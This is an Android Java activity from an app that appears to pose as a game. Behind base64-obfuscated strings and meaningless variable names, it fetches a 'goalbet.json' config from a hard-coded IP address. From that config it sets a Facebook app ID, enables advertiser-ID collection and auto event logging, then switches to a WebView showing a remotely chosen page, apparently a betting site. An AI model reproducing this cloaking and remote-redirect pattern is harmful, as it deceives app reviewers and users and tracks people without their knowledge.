package com.polombear;

import static com.polombear.BlankFragmentGameGb.bak;

import static com.polombear.BlankFragmentWebGb.udsay;


import static com.polombear.BlankFragmentWebGb.webViewGb;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;


import androidx.appcompat.app.AppCompatActivity;
import androidx.navigation.NavController;
import androidx.navigation.Navigation;


import android.app.Activity;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import android.os.CountDownTimer;
import android.util.Log;
import android.view.Display;
import android.webkit.ValueCallback;


import com.facebook.FacebookSdk;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


public class GB extends AppCompatActivity {

    public static Display display;
    public static int width;
    public static int height;
    public static NavController navController;
    public static String tttte;
    public static String vcvsd;
    public static String nbjdds;
    public static String vchasa;
    public static String nnhdsa;
    public static String bbvdh = null;
    public static String uyytsa = "-";
    public static ValueCallback<Uri> uyyas;
    public static Uri ysadha = null;
    public static ValueCallback<Uri[]> bbhsas;
    public static String uuysa;
    public static final int uyaha = 1;



    @Override
    public void onBackPressed() {
        if (bak){
            navController.navigate(R.id.blankFragmentButtonGB);
        }else {
            if (webViewGb.isFocused() && webViewGb.canGoBack()) {
                webViewGb.goBack();
            }
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        display = getWindowManager().getDefaultDisplay();
        width = display.getWidth();
        height = display.getHeight();
        BlankFragmentGameGb.gb = this;
        BlankFragmentButtonGB.gb = this;
        BlankFragmentWebGb.gb = this;
        DecodGB.gb = this;
        BlankFragmentMenuGameGB.gb = this;
        navController = Navigation.findNavController(this, R.id.nav_host_fragment);


        if (BlankFragmentWebGb.isOnline()) {

            tttte = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(DecodGB.decodGb("c2F2ZWRVcmw="), DecodGB.decodGb("bnVsbA=="));
            if (tttte.equals(DecodGB.decodGb("bnVsbA=="))) {

                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(DecodGB.decodGb("aHR0cDovLzE4OC43Mi4yMDMuMTE5L2dvYWxiZXQuanNvbg==")).openConnection();
                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                            vcvsd = bufferedReader.readLine();
                            nbjdds = bufferedReader.readLine();
                            vchasa = bufferedReader.readLine();
                            nnhdsa = bufferedReader.readLine();

                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    FacebookSdk.setApplicationId(nnhdsa);
                                    FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                                    FacebookSdk.sdkInitialize(getApplicationContext());
                                    FacebookSdk.fullyInitialize();
                                    FacebookSdk.setAutoInitEnabled(true);
                                    FacebookSdk.setAutoLogAppEventsEnabled(true);
                                    BlankFragmentWebGb.depp();

                                    new CountDownTimer(20000,1000){

                                        @Override
                                        public void onTick(long l) {
                                            if (!ApppliccationGb.iuhau.equals("-") || !uyytsa.equals("-")) {
                                                cancel();
                                                DecodGB.startWeGB(nbjdds, vcvsd);
                                            } else {

                                            }

                                        }

                                        @Override
                                        public void onFinish() {
                                            DecodGB.startWeGB(nbjdds, vcvsd);
                                        }
                                    }.start();


                                }
                            });


                        }catch (Exception e){
                           runOnUiThread(new Runnable() {
                               @Override
                               public void run() {
                                   noInternet();
                               }
                           });
                        }
                    }
                }).start();



            } else {
                udsay = tttte;
                navController.navigate(R.id.blankFragmentWebGb);
            }

        } else {

            noInternet();

        }


    }


    public void noInternet() {
        new AlertDialog.Builder(this)
                .setTitle(DecodGB.decodGb("Q2hlY2sgdGhlIGludGVybmV0IGNvbm5lY3Rpb24gcGxlYXNlIQ=="))
                .setNeutralButton(DecodGB.decodGb("b2s="), new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        startActivity(new Intent(getApplication(), GB.class));
                        finishAffinity();
                    }
                }).show();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != uyaha || bbhsas == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri[] results = null;
        if (resultCode == Activity.RESULT_OK) {
            if (data == null) {
                if (uuysa != null) {
                    results = new Uri[]{Uri.parse(uuysa)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    results = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        bbhsas.onReceiveValue(results);
        bbhsas = null;
        if (uyyas == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri result = null;
        try {
            if (resultCode != RESULT_OK) {
                result = null;
            } else {
                result = data == null ? ysadha : data.getData();
            }
        } catch (Exception e) { }
        uyyas.onReceiveValue(result);
        uyyas = null;
    }
}